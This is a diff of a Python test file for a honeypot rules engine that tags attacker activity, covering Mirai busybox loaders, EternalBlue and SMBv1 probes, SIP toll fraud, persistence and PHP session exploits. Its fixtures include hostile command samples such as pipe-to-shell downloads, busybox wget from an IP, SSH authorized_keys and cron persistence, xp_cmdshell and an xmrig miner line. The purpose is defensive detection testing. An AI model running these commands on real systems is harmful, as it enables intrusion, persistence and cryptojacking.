@@ -58,7 +58,7 @@ SERVICE_POSITIVE: dict[str, list[Case]] = {
                 cmd("EXEC master..xp_cmdshell 'whoami'", "mssql"),
                 cmd("select sp_OACreate 1", "mssql"), flagged("mysql", ["udf"], "command"),
                 flagged("mssql", ["lolbin"], "command"), flagged("mssql", ["shell_command"], "command"), flagged("mysql", ["xp_cmdshell"], "command")],
-    "db-ransom": [flagged("mysql", ["drop_database"], "command"), flagged("mssql", ["ransom_note"], "command"),
+    "db-ransom": [flagged("mysql", ["ransom_note", "drop_database"], "command"), flagged("mssql", ["ransom_note"], "command"),
                   flagged("redis", ["ransom_note"], "command")],
     "service-download-drop": [
         ("download_attempt", "redis", {"url": "http://x/a"}), ("download_attempt", "mssql", {"url": "http://x/a"}),
@@ -66,17 +66,21 @@ SERVICE_POSITIVE: dict[str, list[Case]] = {
         ("download_attempt", "synology", {"url": "http://x/a"}),
     ],
     "adb-malware-drop": [flagged("adb", ["adb_push"], "command"), flagged("adb", ["adb_install"], "command")],
-    "adb-mirai": [("command", "adb", {"flags": ["adb_shell"], "input": "busybox wget http://198.51.100.9/x"}),
-                  ("command", "adb", {"flags": ["adb_shell"], "input": "cd /data/local/tmp; busybox ECCHI"})],
-    "adb-mirai-download": [("download_attempt", "adb", {"url": "http://198.51.100.9/x", "command": "busybox wget http://198.51.100.9/x"})],
-    "smb-eternalblue": [
-        flagged("smb", ["eternalblue"]), flagged("smb", ["smbv1", "ms17_010"]),
+    "adb-mirai": [("command", "adb", {"flags": ["adb_shell"], "input": "cd /data/local/tmp; busybox ECCHI"}),
+                  ("command", "adb", {"flags": ["adb_shell"], "input": "/bin/busybox ZORRO"})],
+    "adb-mirai-download": [("download_attempt", "adb", {"url": "http://198.51.100.9/x", "command": "busybox MIRAI; busybox wget http://198.51.100.9/x"})],
+    "smb-eternalblue": [flagged("smb", ["eternalblue"]), flagged("smb", ["smbv1", "ms17_010"])],
+    "smb-v1-probe": [
         ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "trans2", "flags": ["smbv1"]}),
         ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "nt_transact", "flags": ["smbv1"]}),
-        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "trans", "flags": ["smbv1"]}),
+        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "session_setup_andx", "flags": ["smbv1"]}),
+        ("scan", "smb", {"kind": "smb1_negotiate", "smb1_outcome": "reset", "flags": ["smbv1"]}),
     ],
     "redis-miner": [flagged("redis", ["miner"], "command"), flagged("redis", ["kinsing", "dropper"], "command")],
-    "sip-fraud": [flagged("sip", ["invite"]), flagged("sip", ["register"]), flagged("sip", ["toll_fraud"])],
+    "sip-fraud": [flagged("sip", ["invite", "toll_fraud"], "command"),
+                  flagged("sip", ["invite", "toll_fraud", "register"], "login_attempt")],
+    "sip-probe": [flagged("sip", ["register"], "login_attempt"), flagged("sip", ["invite"], "command"),
+                  flagged("sip", ["register", "scanner_ua"])],
     "rdp-bluekeep": [flagged("rdp", ["bluekeep_probe"], "disconnect"),
                      flagged("rdp", ["rdp_ntlm", "bluekeep_probe"], "disconnect")],
     "rdp-weak-credentials": [flagged("rdp", ["rdp_ntlm", "weak_password_match"], "disconnect"),
@@ -86,7 +90,7 @@ SERVICE_POSITIVE: dict[str, list[Case]] = {
     "sip-options-scan": [flagged("sip", ["options_scan"]), flagged("sip", ["scanner_ua", "response"])],
     "synology-dsm": [flagged("synology", ["dsm_api"], "http_request"),
                      flagged("synology", ["dsm_api", "dsm_login"], "http_request")],
-    "synology-exploit": [flagged("synology", ["sid_forge"], "http_request"),
+    "synology-exploit": [flagged("synology", ["dsm_api", "sid_forge"], "http_request"),
                          flagged("synology", ["dsm_api", "scgi_injection"], "http_request")],
     "synology-c3rb3r": [flagged("synology", ["ransom_indicator"], "http_request")],
 }  # fmt: skip
@@ -100,6 +104,7 @@ SERVICE_NEGATIVE: dict[str, list[Case]] = {
     "sql-rce": [cmd("select 1", "mssql"), flagged("mssql", ["into_outfile"], "command"),
                 cmd("xp_cmdshell whoami", "ssh"), flagged("redis", ["xp_cmdshell"], "command")],
     "db-ransom": [flagged("mysql", ["into_outfile"], "command"), flagged("sip", ["drop_database"]),
+                  flagged("mysql", ["drop_database"], "command"),
                   flagged("web", ["ransom_note"], "http_request")],
     "service-download-drop": [
         ("download_attempt", "ssh", {"url": "http://x/a"}), ("command", "redis", {"input": "SET a b"}),
@@ -107,18 +112,31 @@ SERVICE_NEGATIVE: dict[str, list[Case]] = {
     ],
     "adb-malware-drop": [flagged("adb", ["adb_shell"], "command"), flagged("ssh", ["adb_push"], "command")],
     "adb-mirai": [("command", "adb", {"flags": ["adb_shell"], "input": "getprop ro.product.model"}),
-                  ("command", "ssh", {"flags": ["adb_shell"], "input": "busybox x"})],
+                  ("command", "ssh", {"flags": ["adb_shell"], "input": "busybox ECCHI"}),
+                  # generic busybox use or download-and-run is not a family
+                  ("command", "adb", {"flags": ["adb_shell"], "input": "busybox wget http://198.51.100.9/x"}),
+                  ("command", "adb", {"flags": ["adb_shell"], "input": "cat /dev/watchdog"})],
     "adb-mirai-download": [("download_attempt", "adb", {"url": "http://x/y", "command": "curl http://x/y"}),
-                           ("download_attempt", "ssh", {"command": "busybox wget x"})],
+                           ("download_attempt", "ssh", {"command": "busybox ECCHI"}),
+                           ("download_attempt", "adb", {"command": "busybox wget http://x/y"})],
     "smb-eternalblue": [
         flagged("smb", ["smbv1", "null_session"]), flagged("ssh", ["eternalblue"]),
         ("scan", "smb", {"kind": "smb1_negotiate", "smb1_outcome": "reset", "flags": ["smbv1"]}),
-        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "session_setup_andx", "flags": ["smbv1"]}),
-        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "negotiate", "flags": ["smbv1"]}),
-        ("scan", "ssh", {"kind": "smb1_command", "smb1_command_name": "trans2"}),
+        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "trans2", "flags": ["smbv1"]}),
+        ("scan", "smb", {"kind": "smb1_command", "smb1_command_name": "nt_transact", "flags": ["smbv1"]}),
+    ],
+    "smb-v1-probe": [
+        flagged("smb", ["smbv1"], "login_attempt"), flagged("ssh", ["smbv1"]),
+        # a multi-protocol negotiate from a modern client is ordinary
+        ("scan", "smb", {"kind": "smb1_negotiate", "smb1_outcome": "steer_smb2_wildcard", "flags": ["smbv1"]}),
+        ("scan", "smb", {"kind": "malformed_smb2", "flags": ["ntlm"]}),
     ],
     "redis-miner": [flagged("redis", ["download"], "command"), flagged("docker", ["miner"], "command")],
-    "sip-fraud": [flagged("sip", ["options_scan"]), flagged("web", ["invite"], "http_request")],
+    "sip-fraud": [flagged("sip", ["options_scan"]), flagged("web", ["invite", "toll_fraud"], "http_request"),
+                  flagged("sip", ["invite"], "command"), flagged("sip", ["register"], "login_attempt"),
+                  flagged("sip", ["toll_fraud"])],
+    "sip-probe": [flagged("sip", ["options_scan"]), flagged("web", ["register"], "http_request"),
+                  flagged("sip", ["invite", "toll_fraud"], "command")],
     "rdp-bluekeep": [flagged("rdp", ["rdp_ntlm"], "disconnect"), flagged("smb", ["bluekeep_probe"]),
                      flagged("rdp", ["rdp_ntlm", "null_session"], "disconnect")],
     "rdp-weak-credentials": [flagged("rdp", ["rdp_ntlm"], "disconnect"), flagged("ssh", ["weak_password_match"], "disconnect")],
@@ -129,7 +147,10 @@ SERVICE_NEGATIVE: dict[str, list[Case]] = {
     "synology-dsm": [flagged("synology", ["dsm_version_probe"], "http_request"),
                      flagged("web", ["dsm_api"], "http_request")],
     "synology-exploit": [flagged("synology", ["dsm_api", "dsm_login"], "http_request"),
-                         flagged("web", ["sid_forge"], "http_request")],
+                         flagged("web", ["dsm_api", "sid_forge"], "http_request"),
+                         # a session id or injection shape off the DSM web API is not enough
+                         flagged("synology", ["sid_forge"], "http_request"),
+                         flagged("synology", ["scgi_injection"], "http_request")],
     "synology-c3rb3r": [flagged("synology", ["file_write"], "http_request"),
                         flagged("web", ["ransom_indicator"], "http_request")],
 }  # fmt: skip
@@ -139,8 +160,8 @@ POSITIVE: dict[str, list[tuple[str, str, dict[str, Any]]]] = {
         cmd("uname -a"), cmd("cat /proc/cpuinfo | grep name | wc -l"), cmd("/usr/bin/nproc"),
         cmd("free -m; id"), cmd("w"), cmd("cat /etc/os-release"),
     ],
-    "mirai-busybox": [cmd("/bin/busybox ECCHI"), cmd("busybox wget http://x/y"), cmd("cat /dev/watchdog")],
-    "mirai-telnet-loader": [cmd("enable", "telnet"), cmd("linuxshell", "telnet"), cmd("SYSTEM", "telnet")],
+    "mirai-busybox": [cmd("/bin/busybox ECCHI"), cmd("cd /tmp; /bin/busybox MIRAI"), cmd("./mirai.arm7"),
+                      cmd("/bin/busybox ZORRO", "telnet")],
     "crypto-miner": [
         cmd("./xmrig -o stratum+tcp://pool:3333"), cmd("wget http://x/minerd -O m"),
         ("download_attempt", "ssh", {"url": "http://198.51.100.9/kinsing", "tool": "wget"}),
@@ -151,11 +172,17 @@ POSITIVE: dict[str, list[tuple[str, str, dict[str, Any]]]] = {
         cmd("curl http://x/s.sh | sh"), cmd("wget -qO- http://x | bash"),
     ],
     "persistence": [
-        cmd("echo key >> ~/.ssh/authorized_keys"), cmd("crontab -l"), cmd("echo x >> /etc/rc.local"),
-        cmd("chattr +i /root/.ssh"),
+        cmd("echo key >> ~/.ssh/authorized_keys"), cmd("echo x >> /etc/rc.local"),
+        cmd("chattr +i /root/.ssh"), cmd("(crontab -l; echo '* * * * * /tmp/x') | crontab -"),
+        cmd("systemctl enable evil.service"), cmd("cat key.pub > /root/.ssh/authorized_keys"),
+        cmd("echo x >>/etc/cron.d/y 2>/dev/null"), cmd("cp k ~/.ssh/authorized_keys"),
     ],
     "php2shell": [
-        http("POST", "/index.php", flags=["php2shell"]), http("POST", "/", flags=["upload_progress"]),
+        http("POST", "/index.php", flags=["php2shell", "upload_progress"]),
+        http("GET", "/x", flags=["php2shell", "lfi", "session_include", "session_ref_match"]),
+    ],
+    "php-upload-progress-probe": [
+        http("POST", "/", flags=["upload_progress"]),
         http("GET", "/index.php", query="PHP_SESSION_UPLOAD_PROGRESS=x"),
         http("GET", "/upload_progress.php"),
     ],
@@ -179,14 +206,24 @@ POSITIVE: dict[str, list[tuple[str, str, dict[str, Any]]]] = {
 NEGATIVE: dict[str, list[tuple[str, str, dict[str, Any]]]] = {
     "recon-commands": [cmd("echo hello"), cmd("ls -la /tmp"), cmd("ping 192.0.2.1"),
                        ("login_attempt", "ssh", {"input": "uname"})],
-    "mirai-busybox": [cmd("ls /bin"), cmd("echo hi"), cmd("enable", "ssh")],
-    "mirai-telnet-loader": [cmd("enable", "ssh"), cmd("ls", "telnet"), cmd("enable now", "telnet")],
+    "mirai-busybox": [cmd("ls /bin"), cmd("echo hi"), cmd("enable", "telnet"), cmd("sh", "telnet"),
+                      cmd("busybox wget http://x/y"), cmd("busybox ls /bin"), cmd("cat /dev/watchdog"),
+                      cmd("curl http://x/s.sh | sh")],
     "crypto-miner": [cmd("ls -la"), cmd("wget http://x/index.html"),
                      ("download_attempt", "ssh", {"url": "http://example.org/readme.txt"})],
     "exec-attempt": [cmd("chmod 600 secret"), cmd("ls ./"), cmd("echo shell"), cmd("cat file | wc -l")],
-    "persistence": [cmd("cat /etc/hostname"), cmd("echo cron")],
+    "persistence": [cmd("cat /etc/hostname"), cmd("echo cron"), cmd("crontab -l"),
+                    cmd("cat ~/.ssh/authorized_keys"), cmd("cat /etc/rc.local"),
+                    cmd("cat ~/.ssh/authorized_keys 2>/dev/null"), cmd("cat /etc/rc.local 2> /dev/null"), cmd("cat .bashrc")],
     "php2shell": [http("GET", "/index.php"), http("POST", "/", flags=["other"]),
-                  http("GET", "/", query="a=b")],
+                  http("GET", "/", query="a=b"),
+                  # touching upload-progress, or a bare session-file include, is only a probe
+                  http("POST", "/", flags=["upload_progress"]),
+                  http("GET", "/index.php", query="PHP_SESSION_UPLOAD_PROGRESS=x"),
+                  http("GET", "/upload_progress.php"),
+                  http("GET", "/x", flags=["lfi", "session_include"])],
+    "php-upload-progress-probe": [http("GET", "/index.php"), http("POST", "/", flags=["other"]),
+                                  http("POST", "/", flags=["php2shell", "upload_progress"])],
     "wordpress-bruteforce": [http("GET", "/wp-login.php"), http("POST", "/login.php"),
                              http("POST", "/wp-login.php.bak")],
     "phpmyadmin-bruteforce": [http("GET", "/phpmyadmin/"), http("POST", "/index.php")],
@@ -231,9 +268,9 @@ def test_credential_stuffing_applies_to_every_sensor(sensor: str) -> None:
 def test_new_sensor_flags_end_to_end() -> None:
     assert ALL.tag_event(
         "command", "adb", {"flags": ["adb_shell", "adb_push"], "input": "busybox wget x"}
-    ) == [
-        "malware-drop",
-        "mirai",
+    ) == ["malware-drop"]
+    assert ALL.tag_event("command", "adb", {"flags": ["adb_shell"], "input": "busybox ECCHI"}) == [
+        "mirai"
     ]
     assert ALL.tag_event("scan", "sip", {"flags": ["options_scan"]}) == ["scanner"]
     assert ALL.tag_event("command", "redis", {"flags": ["cron_write"]}) == ["persistence"]
@@ -255,7 +292,7 @@ def test_required_tags_exist() -> None:
         "wordpress-bruteforce", "phpmyadmin-bruteforce", "credential-stuffing", "scanner",
         "env-file-probe", "redis-rogue-master", "container-escape", "sql-rce", "db-ransom",
         "eternalblue", "sip-fraud", "bluekeep", "weak-credentials", "rdp-cleartext",
-        "synology-dsm", "synology-exploit", "c3rb3r",
+        "synology-dsm", "synology-exploit", "c3rb3r", "smb-v1-probe", "php-upload-progress-probe",
     } <= set(ALL.tags)  # fmt: skip
 
 
@@ -305,6 +342,22 @@ def test_deep_nesting_rejected(tmp_path: Path) -> None:
         cond = "{not: " + cond + "}"
     with pytest.raises(RuleError, match="deeply"):
         load_rules(write(tmp_path, f"rules:\n  - {{id: a, tag: x, when: {cond}}}\n"))
+
+
+def test_has_all_needs_every_value(tmp_path: Path) -> None:
+    body = """
+rules:
+  - {id: any, tag: t-any, when: {field: data.flags, has: [alpha, beta]}}
+  - {id: all, tag: t-all, when: {field: data.flags, has_all: [alpha, beta]}}
+"""
+    t = load_rules(write(tmp_path, body)).tag_event
+    assert t("scan", "ssh", {"flags": ["ALPHA"]}) == ["t-any"]
+    assert t("scan", "ssh", {"flags": ["beta", "alpha", "x"]}) == ["t-all", "t-any"]
+    assert t("scan", "ssh", {"flags": "alpha"}) == [] and t("scan", "ssh", {}) == []
+    with pytest.raises(RuleError, match="non-empty"):
+        load_rules(
+            write(tmp_path, "rules:\n  - {id: a, tag: x, when: {field: data.flags, has_all: []}}\n")
+        )
 
 
 def test_operators(tmp_path: Path) -> None:
